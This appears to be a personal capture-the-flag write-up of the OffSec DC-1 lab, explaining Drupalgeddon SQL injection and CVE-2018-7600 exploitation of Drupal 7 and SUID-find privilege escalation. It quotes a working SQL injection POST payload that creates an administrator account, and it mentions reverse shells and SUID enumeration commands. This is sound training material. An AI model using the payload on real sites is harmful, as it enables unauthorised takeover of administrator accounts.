
# OffSec DC-1

## Overview

**Objective:** Exploit a vulnerable Drupal 7.x web application using Drupalgeddon (SQL Injection) and Drupalgeddon2 (RCE) to gain a foothold, then escalate privileges to root by abusing a SUID `find` binary.

### Learning Objectives

- Perform an nmap scan to identify open ports and services on the target.
- Enumerate the Drupal CMS version and identify vulnerabilities using tools like `searchsploit`.
- Exploit the Drupalgeddon2 vulnerability (CVE-2018-7600) to gain remote code execution and obtain a reverse shell.
- Perform local enumeration to identify privilege escalation vectors.
- Escalate privileges to root by abusing the SUID permission on the `find` binary.

### 3.5 Understanding the Drupalgeddon SQL Injection (Deep Dive)

Opened the exploit source to understand the injection mechanism:

```
gedit 34992.py 
```

![](attachments/Pasted%20image%2020260716205733.png)

The core payload from the exploit:

```python
# Add new user:
# insert into users (status, uid, name, pass) SELECT 1, MAX(uid)+1, 'admin', '$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld' FROM users
#
# Set administrator permission (rid = 3):
# insert into users_roles (uid, rid) VALUES ((SELECT uid FROM users WHERE name = 'admin'), 3)
#
post_data = "name[0%20;insert+into+users+(status,+uid,+name,+pass)+SELECT+1,+MAX(uid)%2B1,+%27"+user+"%27,+%27"+hash[:55]+"%27+FROM+users;insert+into+users_roles+(uid,+rid)+VALUES+((SELECT+uid+FROM+users+WHERE+name+%3d+%27"+user+"%27),+3);;#%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
```

#### How the Injection Works

**Normal login query:**

```sql
SELECT * FROM users
WHERE name='admin'
AND pass='password';
```

**What the attacker injects:**

The `name` parameter is manipulated to terminate the original query and inject two new SQL statements:

**Statement 1 — Create a new user:**

```sql
INSERT INTO users
(status, uid, name, pass)
SELECT
1,
MAX(uid)+1,
'admin',
'$S$DkIkdKLIvRK0...'
FROM users;
```

- `status = 1` → account is enabled
- `uid = MAX(uid)+1` → next available user ID
- `name` → attacker-chosen username
- `pass` → Drupal-formatted password hash

**Statement 2 — Grant admin role:**

```sql
INSERT INTO users_roles
(uid, rid)
VALUES
(
(SELECT uid FROM users WHERE name='admin'),
3
);
```

Drupal roles:

| rid | Role                |
| --- | ------------------- |
| 1   | Anonymous           |
| 2   | Authenticated User  |
| 3   | Administrator       |

The `#` SQL comment at the end prevents syntax errors from the remainder of Drupal's original query.

**URL encoding** (`%20` = space, `%27` = `'`, `%2B` = `+`, `%3d` = `=`) is necessary because the payload is sent as an HTTP POST body.

## Lessons Learned

1. **Check Python version before running exploits.** The Drupalgeddon SQLi script (`34992.py`) is Python 2 — running it with Python 3 gives misleading syntax errors.

2. **robots.txt is a free wordlist.** Stripping `Disallow:` prefixes and feeding the result to Gobuster is a quick way to validate all exposed paths.

3. **Don't give up after one exploit fails — pivot.** The SQLi-to-webshell modification and the `35150.php` RCE both failed. The GitHub CVE-2018-7600 PoC worked cleanly.

4. **Always run both `sudo -l` AND `find / -user root -perm /4000`** after getting a shell. They check different privilege escalation vectors.

5. **GTFOBins is essential for SUID abuse.** Once `find` was identified as SUID-root, the escalation was trivial — but the `-p` flag on `/bin/sh` may not be supported on older Debian systems. Adapt the command.

6. **`rlwrap` improves reverse shell usability.** Wrapping netcat with `rlwrap -cAr` gives arrow key and command history support.

7. **Understand exploits before using them.** Analyzing the Drupalgeddon SQLi payload revealed how it crafts two `INSERT` statements via URL-encoded SQL injection through the `name[]` array parameter — valuable knowledge for manual SQLi testing with Burp.
